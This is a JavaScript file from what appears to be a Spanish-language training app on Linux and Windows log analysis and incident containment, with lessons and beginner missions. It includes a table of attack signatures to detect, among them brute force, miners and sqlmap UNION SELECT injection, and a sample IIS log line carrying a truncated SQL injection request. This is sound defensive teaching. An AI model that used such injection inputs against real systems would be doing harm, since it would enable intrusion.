    <tr><td><code>syslog</code></td><td>Mensajes generales</td></tr><tr><td><code>auth.log</code></td><td>Logins, sudo, usuarios nuevos</td></tr><tr><td><code>kern.log</code></td><td>Kernel: memoria agotada (OOM), discos</td></tr><tr><td><code>nginx/access.log</code></td><td>Cada petición web</td></tr><tr><td><code>postgresql/</code>, <code>webapp/</code></td><td>Base de datos y aplicación</td></tr></tbody></table></div>
    <p><b>Rotación:</b> para que no crezcan sin fin, <code>logrotate</code> renombra cada día <code>syslog → syslog.1</code>, luego comprime a <code>syslog.2.gz</code>… Por eso a veces el dato que buscas está en el <i>fichero rotado</i>.</p>
    ${thBox('Nota:', 'además existe el <b>journal</b> de systemd (<code>journalctl</code>), una base binaria que reúne casi todo y se filtra por servicio y fecha.')}
    ${thList([['ls -lh /var/log', 'Qué ficheros hay, tamaño y fecha'], ['ls /var/log/nginx', 'Contenido de una carpeta de logs']])}` },
  { id: 'tl3', t: '3 · Leer ficheros', html: `<p>Los comandos básicos para moverte y leer:</p><div class="tbl"><table><thead><tr><th>Comando</th><th>Para qué</th></tr></thead><tbody>
    <tr><td><code>pwd</code></td><td>En qué carpeta estás</td></tr><tr><td><code>ls</code> / <code>ls -l</code></td><td>Listar (con detalle y permisos)</td></tr><tr><td><code>cd carpeta</code></td><td>Entrar en una carpeta (<code>cd ..</code> sube)</td></tr><tr><td><code>cat fichero</code></td><td>Mostrarlo entero (cuidado con los grandes)</td></tr><tr><td><code>head -n 5 f</code></td><td>Primeras 5 líneas</td></tr><tr><td><code>tail -n 5 f</code></td><td>Últimas 5 líneas</td></tr><tr><td><code>tail -f f</code></td><td>Seguirlo <b>en directo</b> (Ctrl+C para salir)</td></tr><tr><td><code>less f</code></td><td>Navegar: espacio avanza, <code>/texto</code> busca, <code>q</code> sale</td></tr></tbody></table></div>
    ${thBox('Truco:', 'pulsa <b>Tab</b> para autocompletar nombres y <b>↑</b> para repetir comandos anteriores.')}
    ${thList([['pwd', 'Dónde estoy'], ['ls /var/log', 'Listar logs'], ['head -n 5 /var/log/syslog', 'Primeras 5 líneas'], ['tail -n 5 /var/log/syslog', 'Últimas 5 líneas'], ['less /var/log/auth.log', 'Navegar (q para salir)', 0], ['tail -f /var/log/auth.log', 'En directo (Ctrl+C)', 0]])}` },
  { id: 'tl4', t: '4 · Filtrar con grep', html: `<p>Un log puede tener miles de líneas. <code>grep</code> muestra sólo las que contienen un texto.</p><div class="tbl"><table><thead><tr><th>Opción</th><th>Efecto</th></tr></thead><tbody>
    <tr><td><code>grep texto fichero</code></td><td>Líneas que contienen «texto»</td></tr><tr><td><code>-i</code></td><td>Ignora mayúsculas</td></tr><tr><td><code>-v</code></td><td>Invierte: líneas que <b>no</b> lo contienen</td></tr><tr><td><code>-c</code></td><td>Sólo cuenta las líneas</td></tr><tr><td><code>-E 'a|b'</code></td><td>Varias palabras (a <b>o</b> b)</td></tr><tr><td><code>-B2 -A2</code></td><td>Con 2 líneas de contexto antes y después</td></tr><tr><td><code>-r</code></td><td>Recursivo en una carpeta</td></tr></tbody></table></div>
    <p>Los ficheros rotados <code>.gz</code> se leen con <code>zgrep</code>/<code>zcat</code>. La <b>tubería</b> <code>|</code> encadena comandos: la salida del primero entra en el segundo.</p>
    ${thList([["grep -i error /var/log/syslog | tail", 'Errores (cualquier mayúscula), los últimos'], ["grep -c 'Failed password' /var/log/auth.log", 'Cuántos fallos de contraseña'], ["grep -v CRON /var/log/syslog | tail", 'Todo menos cron'], ["zgrep -h 'Failed password' /var/log/auth.log* | tail -3", 'Incluye los rotados .gz']])}` },
  { id: 'tl5', t: '5 · Contar y ordenar', html: `<p>La receta más útil del analista: <b>extraer un campo → ordenar → contar repetidos → ordenar por cantidad</b>.</p>
    <pre>grep 'Failed password' auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head</pre>
    <ul><li><code>awk '{print $1}'</code> imprime una columna (campos separados por espacios); <code>$NF</code> es la última y <code>$(NF-3)</code> la cuarta contando desde el final.</li><li><code>sort</code> ordena y <code>uniq -c</code> cuenta repetidos <b>consecutivos</b> (por eso se ordena antes).</li><li><code>sort -nr</code> ordena por número, de mayor a menor. <code>head</code> deja los primeros.</li><li><code>wc -l</code> cuenta líneas; <code>cut -d' ' -f1</code> corta por delimitador.</li></ul>
    ${thBox('Piensa así:', '«¿qué IP aparece más veces?» = extraer la IP + <code>sort | uniq -c | sort -nr</code>. Funciona para IPs, usuarios, códigos HTTP, URLs…')}
    ${thList([["awk '{print $9}' /var/log/nginx/access.log | sort | uniq -c | sort -nr", 'Códigos HTTP más frecuentes'], ["awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -5", 'IPs que más piden'], ["grep -c 'Failed password' /var/log/auth.log.1", 'Contar fallos en el log rotado']])}` },
  { id: 'tl6', t: '6 · systemd: journalctl y systemctl', html: `<p><code>systemctl</code> gestiona los <b>servicios</b>; <code>journalctl</code> lee su diario.</p><div class="tbl"><table><thead><tr><th>Comando</th><th>Para qué</th></tr></thead><tbody>
    <tr><td><code>systemctl status nginx</code></td><td>¿Está activo? Últimas líneas de su log</td></tr><tr><td><code>systemctl --failed</code></td><td>Servicios caídos</td></tr><tr><td><code>journalctl -u nginx --no-pager</code></td><td>Log de un servicio</td></tr><tr><td><code>journalctl -p err -b</code></td><td>Sólo errores desde el arranque</td></tr><tr><td><code>journalctl --since "2 hours ago"</code></td><td>Por fecha</td></tr><tr><td><code>journalctl -k</code></td><td>Mensajes del kernel</td></tr><tr><td><code>sudo systemctl restart X</code></td><td>Reiniciar un servicio (requiere sudo)</td></tr></tbody></table></div>
    <p><b>Cadena típica de fallos:</b> memoria agotada → el kernel mata un proceso (<i>OOM killer</i>) → el disco se llena de logs → la base de datos no puede escribir y cae → la web da error 502. Se reconstruye leyendo cada log <b>en orden cronológico</b>.</p>
    ${thList([['systemctl --failed', 'Servicios caídos'], ['systemctl status nginx', 'Estado de nginx'], ['journalctl -p err -b --no-pager | tail', 'Errores recientes'], ['df -h', 'Espacio en disco'], ['free -h', 'Memoria']])}` },
  { id: 'tl7', t: '7 · sudo y cómo actuar', html: `<p>Eres <code>alumno</code>: puedes leer, pero para <b>cambiar</b> el sistema necesitas <code>sudo</code> (ejecutar como administrador; pide tu contraseña). Todo lo que haces con sudo queda registrado en <code>auth.log</code>.</p><div class="tbl"><table><thead><tr><th>Objetivo</th><th>Comando</th></tr></thead><tbody>
    <tr><td>Ver procesos que más CPU gastan</td><td><code>ps aux --sort=-%cpu | head</code></td></tr><tr><td>Terminar un proceso</td><td><code>sudo kill -9 PID</code></td></tr><tr><td>Bloquear una IP</td><td><code>sudo ufw deny from IP</code></td></tr><tr><td>Borrar un usuario (y su carpeta)</td><td><code>sudo userdel -r nombre</code></td></tr><tr><td>Vaciar un log sin borrarlo</td><td><code>sudo truncate -s 0 fichero</code></td></tr><tr><td>Cambiar una línea de config</td><td><code>sudo sed -i 's/viejo/nuevo/' fichero</code></td></tr></tbody></table></div>
    ${thBox('Orden de contención:', '1) <b>entender</b> qué pasó (logs), 2) <b>cortar</b> procesos y sesiones, 3) <b>bloquear</b> la entrada (IP, cuenta, configuración), 4) <b>verificar</b> que ya no ocurre, 5) <b>documentar</b>.')}
    ${thList([['ps aux --sort=-%cpu | head -5', 'Procesos por CPU'], ['sudo ufw status numbered', 'Reglas del cortafuegos'], ['who', 'Quién está conectado']])}` },
  { id: 'tl8', t: '8 · Reconocer ataques en un log', html: `<p>Aprende a reconocer <b>patrones</b>:</p><div class="tbl"><table><thead><tr><th>Patrón en el log</th><th>Significa</th></tr></thead><tbody>
    <tr><td>Cientos de <code>Failed password</code> de la misma IP en minutos</td><td>Fuerza bruta SSH</td></tr><tr><td><code>Accepted password for X from IP</code> justo tras muchos fallos</td><td>La fuerza bruta <b>tuvo éxito</b></td></tr><tr><td><code>useradd</code>, <code>usermod -aG sudo</code></td><td>Cuenta nueva con privilegios (persistencia)</td></tr><tr><td>Proceso con CPU al 300 % en <code>/tmp</code> o ruta rara</td><td>Minero de criptomonedas</td></tr><tr><td>Muchas peticiones 404 a <code>wp-login.php</code>, <code>.env</code>…</td><td>Escáner de rutas</td></tr><tr><td><code>UNION SELECT</code>, <code>sqlmap</code> en el User-Agent</td><td>Inyección SQL automatizada</td></tr><tr><td><code>3 incorrect password attempts</code> en sudo</td><td>Intento de escalada fallido</td></tr></tbody></table></div>
    <p>Anatomía de una línea de auth.log:</p><pre>Nov 11 09:28:12 srv-web01 sshd[21273]: Accepted publickey for alumno from 192.168.1.50 port 48242 ssh2
fecha            host       programa[PID] mensaje (usuario, IP de origen, puerto)</pre>
    ${thBox('Pregunta clave:', '¿hubo <b>éxito</b> tras los fallos? ¿qué hizo el atacante <b>después</b> de entrar? ¿qué dejó para <b>volver</b>?')}` }
];
const THEORY_WIN = [
  { id: 'tw0', t: '0 · Ruta de aprendizaje', html: `<p>Si es tu primera vez con Windows en la consola, sigue este orden. Cada misión tiene su lección (botón «Ver teoría» dentro de la misión).</p>
    <div class="tbl"><table><thead><tr><th>Nivel</th><th>Misión</th><th>Lección</th></tr></thead><tbody>
    <tr><td>🟢 Iniciación</td><td>Primeros pasos con PowerShell</td><td>2</td></tr><tr><td>🟢 Básico</td><td>Reconocimiento · Escribe tus propios eventos</td><td>1, 2, 3</td></tr>
    <tr><td>🟡 Medio</td><td>Fuerza bruta RDP · IIS · Inventario</td><td>4, 5, 6</td></tr><tr><td>🔴 Avanzado</td><td>Persistencia y contención · Forense · Memoria y disco lleno</td><td>3, 4, 6, 7</td></tr></tbody></table></div>
    ${thBox('Cómo se puntúa:', 'cada paso da sus puntos; la <b>pista</b> resta el 30 % y la <b>solución</b> no suma. Los pasos de «hacer» se marcan solos; los de «preguntar» piden respuesta escrita.')}` },
  { id: 'tw1', t: '1 · El registro de eventos', html: `<p>Windows no guarda logs en texto suelto sino en <b>registros de eventos</b> (se ven en el «Visor de eventos»). Cada evento tiene: <b>hora</b>, <b>origen</b> (provider), <b>ID</b>, <b>nivel</b> y <b>mensaje</b>.</p>
    <div class="tbl"><table><thead><tr><th>Registro</th><th>Qué contiene</th></tr></thead><tbody><tr><td><code>System</code></td><td>Servicios, arranque, discos, IIS (WAS)</td></tr><tr><td><code>Application</code></td><td>Aplicaciones y SQL Server</td></tr><tr><td><code>Security</code></td><td>Auditoría de inicios de sesión, cuentas y procesos. <b>Requiere administrador</b></td></tr></tbody></table></div>
    <p>El <b>ID</b> es lo más útil: <code>4624</code> acceso correcto, <code>4625</code> fallido, <code>7036</code> un servicio cambió de estado, <code>6005</code> arranque. Hay una tabla completa en <i>Guía → IDs de evento clave</i>.</p>
    <p><b>Niveles:</b> 1 crítico · 2 error · 3 advertencia · 4 información · 5 detallado. Igual que en Linux: investiga errores y los avisos previos.</p>
    <p>Además hay <b>logs en ficheros</b>: IIS (<code>C:\\inetpub\\logs\\LogFiles</code>, en hora UTC) y las aplicaciones propias (<code>C:\\ProgramData\\…</code>).</p>
    ${thList([['Get-WinEvent -ListLog *', 'Lista los registros y cuántos eventos tienen'], ['Get-WinEvent -LogName System -MaxEvents 5', 'Los 5 últimos eventos de System']])}` },
  { id: 'tw2', t: '2 · PowerShell: primeros pasos', html: `<p>PowerShell no trabaja con texto sino con <b>objetos</b> (cada resultado tiene propiedades). Los comandos se llaman <b>cmdlets</b> y siguen el patrón <b>Verbo-Sustantivo</b>: <code>Get-Process</code>, <code>Stop-Process</code>, <code>Get-Service</code>.</p>
    <ul><li><b>Get-</b> consulta, <b>Set-</b> cambia, <b>Start-/Stop-</b> arrancan/paran, <b>New-</b> crea, <b>Remove-</b> borra.</li><li><b>Tab</b> autocompleta cmdlets, parámetros (<code>-LogName</code>) y rutas.</li><li><code>Get-Help cmdlet -Examples</code> muestra ejemplos; <code>Get-Command *palabra*</code> busca cmdlets.</li><li>Los parámetros empiezan con guion: <code>Get-ChildItem -Force</code>.</li><li>Alias cortos: <code>ls</code>/<code>dir</code>/<code>gci</code> = Get-ChildItem, <code>cat</code> = Get-Content, <code>cd</code>, <code>pwd</code>.</li></ul>
    <p><b>La tubería</b> <code>|</code> pasa objetos de un cmdlet al siguiente:</p><pre>Get-Process | Sort-Object CPU -Descending | Select-Object -First 3</pre>
    ${thBox('Ojo:', 'la consola arranca <b>sin elevar</b>. Con <code>whoami</code> ves quién eres; algunas acciones darán «Access is denied» hasta que eleves (lección 7).')}
    ${thList([['whoami', 'Quién soy'], ['Get-Location', 'En qué carpeta estoy'], ['Get-ChildItem C:\\ProgramData\\ShopApp\\logs', 'Listar una carpeta'], ['Get-Content C:\\ProgramData\\ShopApp\\logs\\app.log -Tail 5', 'Últimas 5 líneas de un fichero'], ['Get-Help Get-Process -Examples', 'Ejemplos de un cmdlet'], ['Get-Process | Sort-Object CPU -Descending | Select-Object -First 3', 'Tubería: top 3 por CPU']])}` },
  { id: 'tw3', t: '3 · Leer y filtrar eventos', html: `<p><code>Get-WinEvent</code> es el cmdlet principal. Lo más eficiente es <b>filtrar en el origen</b> con <code>-FilterHashtable</code> (una tabla clave=valor):</p>
    <pre>Get-WinEvent -FilterHashtable @{LogName='System'; Level=2; StartTime=(Get-Date).AddHours(-6)}</pre>
    <div class="tbl"><table><thead><tr><th>Clave</th><th>Ejemplo</th></tr></thead><tbody><tr><td><code>LogName</code></td><td>'System', 'Application', 'Security'</td></tr><tr><td><code>Id</code></td><td>4625 o varios: 7034,7031</td></tr><tr><td><code>Level</code></td><td>2 (errores)</td></tr><tr><td><code>ProviderName</code></td><td>'MSSQLSERVER'</td></tr><tr><td><code>StartTime</code> / <code>EndTime</code></td><td>(Get-Date).AddHours(-6)</td></tr></tbody></table></div>
    <p>Para ver un evento completo usa <code>| Format-List *</code>; para buscar en el texto, <code>| Where-Object Message -match 'SQL'</code>. Si no hay resultados verás «No events were found…», no es un error grave.</p>
    <p><b>Escribir tus propios eventos</b> (consola elevada): <code>eventcreate /T ERROR /ID 100 /L APPLICATION /SO MiBackup /D "mensaje"</code>.</p>
    ${thList([["Get-WinEvent -FilterHashtable @{LogName='System'; Level=2}", 'Errores de System'], ["Get-WinEvent -FilterHashtable @{LogName='Application'; ProviderName='MSSQLSERVER'} -MaxEvents 5", 'Eventos de SQL Server'], ["Get-WinEvent -FilterHashtable @{LogName='System'; Id=7034,7031}", 'Servicios que se cayeron'], ['Get-EventLog -LogName Application -EntryType Error -Newest 5', 'Cmdlet clásico']])}` },
  { id: 'tw4', t: '4 · Filtrar, contar y ordenar objetos', html: `<p>Los cinco cmdlets de la tubería que más usarás:</p><div class="tbl"><table><thead><tr><th>Cmdlet</th><th>Hace</th></tr></thead><tbody><tr><td><code>Where-Object</code></td><td>Filtra: <code>Where-Object CPU -gt 100</code> o <code>{ $_.Id -eq 4625 }</code></td></tr><tr><td><code>Sort-Object</code></td><td>Ordena: <code>-Descending</code></td></tr><tr><td><code>Select-Object</code></td><td>Elige columnas o <code>-First 5</code></td></tr><tr><td><code>Group-Object</code></td><td>Agrupa y cuenta (como <code>sort | uniq -c</code>)</td></tr><tr><td><code>Measure-Object</code></td><td>Cuenta, suma, media</td></tr></tbody></table></div>
    <p><code>$_</code> es «el objeto actual». Operadores: <code>-eq -ne -gt -lt -like -match -and -or</code>.</p>
    <p><b>Los datos de seguridad están en <code>Properties</code></b>. En el 4625 (fallo de inicio de sesión) la cuenta está en <code>Properties[5]</code> y la IP de origen en <code>Properties[19]</code>; en el 4624 (acceso correcto) el tipo de inicio es <code>Properties[8]</code> (10 = RDP) y la IP <code>Properties[18]</code>.</p>
    <pre>Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} |
  Group-Object { $_.Properties[19].Value } |
  Sort-Object Count -Descending | Select-Object -First 5</pre>
    ${thBox('Recuerda:', 'el registro Security exige consola elevada (lección 7).')}
    ${thList([['Get-Service | Group-Object Status', 'Servicios por estado'], ['Get-Process | Where-Object CPU -gt 100 | Sort-Object CPU -Descending', 'Procesos que más CPU gastan'], ['(Get-WinEvent -LogName System -MaxEvents 100 | Where-Object Id -eq 7036).Count', 'Contar eventos 7036']])}` },
  { id: 'tw5', t: '5 · Logs de ficheros e IIS', html: `<p>Para ficheros de texto (IIS, aplicaciones) usa:</p><div class="tbl"><table><thead><tr><th>Cmdlet</th><th>Equivale a</th></tr></thead><tbody><tr><td><code>Get-Content f -Tail 20</code></td><td><code>tail -n 20</code></td></tr><tr><td><code>Get-Content f -Tail 10 -Wait</code></td><td><code>tail -f</code> (Ctrl+C sale)</td></tr><tr><td><code>Select-String -Path f -Pattern 'x'</code></td><td><code>grep</code> (admite comodines en la ruta)</td></tr><tr><td><code>Get-ChildItem | Sort-Object Length -Descending</code></td><td><code>ls -S</code></td></tr><tr><td><code>Clear-Content f</code></td><td><code>truncate -s 0 f</code></td></tr></tbody></table></div>
    <p>Una línea de IIS (formato W3C) y <b>en UTC</b> (aquí, una hora menos que el reloj del servidor):</p>
    <pre>2026-11-11 07:20:05 192.168.1.30 GET /products id=1'%20UNION… 80 - 192.0.2.88 sqlmap/1.7.2 - 200 0 0 78
fecha     hora     IP servidor   método ruta     consulta   puerto - IP cliente  user-agent  - código</pre>
    ${thBox('Receta:', '<code>Select-String -Path ...\\*.log -Pattern \'IP\' | Measure-Object</code> cuenta las peticiones de una IP.')}
    ${thList([['Get-ChildItem C:\\inetpub\\logs\\LogFiles\\W3SVC1', 'Ficheros de log de IIS'], ["Select-String -Path C:\\inetpub\\logs\\LogFiles\\W3SVC1\\*.log -Pattern 'sqlmap' | Select-Object -First 2", 'Buscar «sqlmap»'], ['Get-Content C:\\ProgramData\\ShopApp\\logs\\app.log -Tail 10', 'Log de la aplicación']])}` },
  { id: 'tw6', t: '6 · Estado del sistema', html: `<p>Qué comprobar y con qué:</p><div class="tbl"><table><thead><tr><th>Quiero ver…</th><th>Comando</th></tr></thead><tbody><tr><td>Quién está conectado por RDP</td><td><code>quser</code></td></tr><tr><td>Procesos</td><td><code>Get-Process</code></td></tr><tr><td>Servicios</td><td><code>Get-Service</code></td></tr><tr><td>Conexiones y puertos</td><td><code>Get-NetTCPConnection</code> · <code>netstat -ano</code></td></tr><tr><td>Cuentas / administradores</td><td><code>Get-LocalUser</code> · <code>Get-LocalGroupMember Administrators</code></td></tr><tr><td>Tareas programadas</td><td><code>Get-ScheduledTask</code></td></tr><tr><td>Disco</td><td><code>Get-PSDrive C</code></td></tr><tr><td>Desde cuándo arrancó</td><td><code>Get-Uptime</code></td></tr><tr><td>Datos del sistema (WMI/CIM)</td><td><code>Get-CimInstance Win32_Service</code></td></tr></tbody></table></div>
    <p><b>Señales sospechosas:</b> un <code>svchost</code> fuera de <code>System32</code>, CPU altísima, una conexión a un puerto raro (3333 suele ser minería), cuentas con nombre casi igual a las legítimas, tareas con nombre de «Windows Update» que apuntan a <code>Temp</code>.</p>
    ${thList([['quser', 'Sesiones RDP'], ['Get-NetTCPConnection -State Established', 'Conexiones activas'], ['Get-LocalUser', 'Cuentas locales'], ['Get-ScheduledTask | Where-Object State -ne Disabled', 'Tareas activas'], ['Get-PSDrive C', 'Espacio en C:']])}` },
  { id: 'tw7', t: '7 · Elevar y actuar', html: `<p>Windows aplica el <b>control de cuentas (UAC)</b>: aunque tu usuario sea administrador, la consola normal trabaja con permisos recortados. Para leer <code>Security</code>, parar procesos, crear reglas de firewall o borrar cuentas debes abrir una consola <b>elevada</b>:</p>
    <pre>Start-Process powershell -Verb RunAs     # responde S al aviso</pre>
    <p>Comprueba con <code>whoami /groups</code> (busca «High Mandatory Level»). <code>exit</code> te devuelve a la sesión sin elevar.</p><div class="tbl"><table><thead><tr><th>Objetivo</th><th>Comando</th></tr></thead><tbody><tr><td>Terminar un proceso</td><td><code>Stop-Process -Id PID -Force</code></td></tr><tr><td>Bloquear una IP</td><td><code>New-NetFirewallRule -DisplayName "Bloquear" -Direction Inbound -Action Block -RemoteAddress IP</code></td></tr><tr><td>Cerrar una sesión RDP</td><td><code>logoff ID</code></td></tr><tr><td>Borrar / deshabilitar cuenta</td><td><code>Remove-LocalUser</code> · <code>Disable-LocalUser</code></td></tr><tr><td>Quitar una tarea programada</td><td><code>Unregister-ScheduledTask -TaskName X -Confirm:$false</code></td></tr><tr><td>Arrancar / parar servicios</td><td><code>Start-Service</code> · <code>Stop-Service</code> · <code>iisreset</code></td></tr><tr><td>Vaciar un log en uso</td><td><code>Clear-Content ruta</code> (Remove-Item falla si está abierto)</td></tr></tbody></table></div>
    ${thBox('Orden de contención:', '1) <b>entender</b> (eventos), 2) <b>cortar</b> proceso y sesión, 3) <b>bloquear</b> IP/cuenta/tarea, 4) <b>verificar</b>, 5) <b>documentar</b>.')}
    ${thList([['Start-Process powershell -Verb RunAs', 'Abrir consola de administrador'], ['whoami /groups', 'Comprobar si estoy elevado']])}` },
  { id: 'tw8', t: '8 · cmd y equivalencias', html: `<p>Escribe <code>cmd</code> para pasar al símbolo del sistema clásico (<code>exit</code> vuelve). Muchos comandos clásicos funcionan también desde PowerShell.</p><div class="tbl"><table><thead><tr><th>Linux</th><th>PowerShell</th><th>cmd</th></tr></thead><tbody>
    <tr><td><code>ls</code></td><td><code>Get-ChildItem</code></td><td><code>dir</code></td></tr><tr><td><code>cat</code></td><td><code>Get-Content</code></td><td><code>type</code></td></tr><tr><td><code>grep</code></td><td><code>Select-String</code></td><td><code>findstr</code></td></tr><tr><td><code>tail -f</code></td><td><code>Get-Content -Wait</code></td><td>—</td></tr><tr><td><code>ps</code></td><td><code>Get-Process</code></td><td><code>tasklist</code></td></tr><tr><td><code>kill</code></td><td><code>Stop-Process</code></td><td><code>taskkill /PID n /F</code></td></tr><tr><td><code>systemctl</code></td><td><code>Get-Service</code></td><td><code>sc query</code></td></tr><tr><td><code>journalctl</code></td><td><code>Get-WinEvent</code></td><td><code>wevtutil qe</code></td></tr><tr><td><code>ss -tulpn</code></td><td><code>Get-NetTCPConnection</code></td><td><code>netstat -ano</code></td></tr><tr><td><code>ufw deny</code></td><td><code>New-NetFirewallRule</code></td><td><code>netsh advfirewall …</code></td></tr><tr><td><code>cron</code></td><td><code>Get-ScheduledTask</code></td><td><code>schtasks</code></td></tr></tbody></table></div>
    ${thList([['tasklist /fi "imagename eq svchost.exe"', 'Procesos por nombre (clásico)'], ['netstat -ano | findstr :3389', 'Conexiones RDP'], ['net user', 'Cuentas locales (clásico)']])}` }
];
const MTHEORY = { linux: { m0: 'tl3', m1: 'tl2', m2: 'tl5', m3: 'tl7', m4: 'tl6', m5: 'tl5', m6: 'tl8', m7: 'tl6', m8: 'tl3' }, win: { w0: 'tw2', w1: 'tw1', w2: 'tw4', w3: 'tw7', w4: 'tw4', w5: 'tw3', w6: 'tw5', w7: 'tw6', w8: 'tw3' } };
/* ---------- misiones de iniciación (para familiarizarse con la herramienta) ---------- */
MISSIONS_LINUX.unshift({ id: 'm0', icon: '🌱', level: 'Iniciación', title: 'Primeros pasos con el terminal',
  intro: 'Antes de investigar nada, practica lo básico: moverte, listar, leer y filtrar. Cada paso se marca solo cuando ejecutas el comando. Lección recomendada: «3 · Leer ficheros».',
  steps: [
    { id: 'm0a', kind: 'do', pts: 5, text: '¿En qué carpeta estás? Averígualo con un comando.', hint: 'pwd', auto: () => ranRe(/^\s*pwd\b/), sol: 'pwd' },
    { id: 'm0b', kind: 'do', pts: 5, text: 'Lista el contenido de /var/log (la carpeta de los logs).', hint: 'ls /var/log', auto: () => ranRe(/^\s*ls\b.*\/var\/log/), sol: 'ls /var/log   (con -lh ves además tamaños y fechas)' },
    { id: 'm0c', kind: 'do', pts: 5, text: 'Lee las 5 primeras líneas de /var/log/syslog con head.', hint: 'head -n 5 /var/log/syslog', auto: () => ranRe(/\bhead\b.*syslog/), sol: 'head -n 5 /var/log/syslog' },
    { id: 'm0d', kind: 'q', pts: 10, text: '¿Qué comando muestra las últimas líneas de un fichero?', hint: 'Es el contrario de head. Lección 3.', check: a => /\btail\b/.test(nrm(a)), sol: 'tail (por ejemplo tail -n 10 fichero; con -f lo sigue en directo).' },
    { id: 'm0e', kind: 'do', pts: 10, text: 'Busca la palabra «error» en /var/log/syslog sin distinguir mayúsculas.', hint: 'grep -i error /var/log/syslog | tail', auto: () => ranRe(/\bgrep\b\s+(-\w*i\w*|--ignore-case)\b.*syslog/), sol: 'grep -i error /var/log/syslog | tail' },
    { id: 'm0f', kind: 'do', pts: 10, text: "Cuenta con grep -c cuántas líneas «Failed password» hay en /var/log/auth.log.", hint: "grep -c 'Failed password' /var/log/auth.log", auto: () => ranRe(/\bgrep\b.*-\w*c\w*\b.*Failed.*auth\.log/), sol: "grep -c 'Failed password' /var/log/auth.log" }
  ] });
MISSIONS_WIN.unshift({ id: 'w0', icon: '🌱', level: 'Iniciación', title: 'Primeros pasos con PowerShell',
  intro: 'Antes de investigar, practica lo básico de PowerShell: quién eres, listar, leer ficheros y usar la tubería. Cada paso se marca solo al ejecutar el comando. Lección recomendada: «2 · PowerShell: primeros pasos».',
  steps: [
    { id: 'w0a', kind: 'do', pts: 5, text: 'Averigua con qué usuario estás conectado.', hint: 'whoami', auto: () => wRan(/^\s*whoami\b/i), sol: 'whoami   (otra forma: $env:USERNAME)' },
    { id: 'w0b', kind: 'do', pts: 5, text: 'Lista el contenido de C:\\ProgramData\\ShopApp\\logs.', hint: 'Get-ChildItem C:\\ProgramData\\ShopApp\\logs', auto: () => wRan(/(get-childitem|\bgci\b|\bls\b|\bdir\b).*shopapp/i), sol: 'Get-ChildItem C:\\ProgramData\\ShopApp\\logs   (alias: ls, dir, gci)' },
    { id: 'w0c', kind: 'do', pts: 10, text: 'Lee las 5 últimas líneas de app.log (en esa misma carpeta).', hint: 'Get-Content C:\\ProgramData\\ShopApp\\logs\\app.log -Tail 5', auto: () => wRan(/(get-content|\bgc\b|\bcat\b|\btype\b).*app\.log.*-tail/i), sol: 'Get-Content C:\\ProgramData\\ShopApp\\logs\\app.log -Tail 5' },
    { id: 'w0d', kind: 'q', pts: 10, text: '¿Con qué verbo empiezan los cmdlets que sólo consultan información (Get-Process, Get-Service…)?', hint: 'Verbo-Sustantivo. Lección 2.', check: a => /\bget\b/.test(nrm(a)), sol: 'Get' },
    { id: 'w0e', kind: 'do', pts: 10, text: 'Busca la palabra ERROR en app.log con Select-String.', hint: 'Select-String -Path C:\\ProgramData\\ShopApp\\logs\\app.log -Pattern ERROR', auto: () => wRan(/(select-string|\bsls\b).*app\.log/i) || wRan(/app\.log.*\|\s*(select-string|sls)\b/i), sol: 'Select-String -Path C:\\ProgramData\\ShopApp\\logs\\app.log -Pattern ERROR' },
    { id: 'w0f', kind: 'do', pts: 10, text: 'Usa la tubería: muestra los 3 procesos que más CPU han consumido.', hint: 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 3', auto: () => wRan(/get-process.*\|.*sort(-object)?.*\|.*select(-object)?/i) || wRan(/\bps\b.*\|.*sort.*\|.*select/i), sol: 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 3' }
  ] });
